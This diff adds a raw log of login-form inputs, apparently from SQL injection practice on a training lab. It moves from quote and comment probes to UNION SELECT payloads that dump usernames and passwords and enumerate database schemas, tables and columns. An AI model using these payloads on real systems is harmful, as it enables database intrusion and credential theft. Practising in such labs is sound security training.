@@ -1,0 +1,56 @@
+User Name:admin'Password:ad
+User Name:admin'Password:ad
+User Name:admin' and 1=1 --+Password:ad
+User Name:admin' and 1=1 --+Password:ad
+User Name:admin' and 1=1 --+Password:ad
+User Name:adminPassword:ad
+User Name:admin'Password:ad
+User Name:admin'--+Password:ad
+User Name:adminPassword:ad'
+User Name:adminPassword:ad'--+
+User Name:DumbPassword:Dumb
+User Name:DumpPassword:Dump
+User Name:DumbPassword:Dump
+User Name:DumbPassword:Dump
+User Name:DumbPassword:Dumb
+User Name:DumbPassword:Dumb'
+User Name:DumbPassword:Dumb'--+
+User Name:DumbPassword:Dumb'--+
+User Name:DumbPassword:Dumb'#--+
+User Name:DumbPassword:Dumb'#
+User Name:DumbPassword:Dumb'-- 
+User Name:DumbPassword:Dumb'--+
+User Name:DumbPassword:Dumb'-- 
+User Name:DumbPassword:Dumb
+User Name:Dumb1Password:Dumb
+User Name:Dumb' #Password:Dumb
+User Name:Dumb' and 1=1 Password:Dumb
+User Name:Dumb' and 1=1 #Password:Dumb
+User Name:Dumb' and 1=2#Password:Dumb
+User Name:Dumb' and select 1,2,3 #Password:Dumb
+User Name:Dumb' union  select 1,2,3 #Password:Dumb
+User Name:Dumb' union  select 1,2  #Password:Dumb
+User Name:2Dumb' union  select 1,2  #Password:Dumb
+User Name:2Dumb' union  select 1,2 from user  #Password:Dumb
+User Name:2Dumb' union  select 1,2 from users  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,username,passwd) from users  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,username,password) from users  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,username,0x3apassword) from users  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,username,0x3,password) from users  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,username,0x3a,password) from users  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,schema_name,0x3a) from infromation_schema  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,schema_name,0x3a) from information_schema  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,schema_name,0x3a) from information_schema.schema  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,schema_name,0x3a) from information_schema.schemata  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,table_name,0x3a) from information_schema.tables   #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,table_name,0x3a) from information_schema.tables where table_shema=secrity  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,table_name,0x3a) from information_schema.tables where table_schema=secrity  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,table_name,0x3a) from information_schema.tables where table_schema=security  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,table_name,0x3a) from information_schema.tables where table_schema=security  #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,table_name,0x3a) from information_schema.tables where table_schema=information_schema #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,table_name,0x3a) from information_schema.tables where table_schema='security' #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,columns_name,0x3a) from information_schema.columns where table_schema='email' #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,columns_name,0x3a) from information_schema.columns where table_name='email' and table_schema='security' #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,column_name,0x3a) from information_schema.columns where table_name='email' and table_schema='security' #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,column_name,0x3a) from information_schema.columns where table_schema='security' #Password:Dumb
+User Name:2Dumb' union  select 1,group_concat(0x3a,column_name,0x3a) from information_schema.columns where table_schema='security' and table_name='users' #Password:Dumb
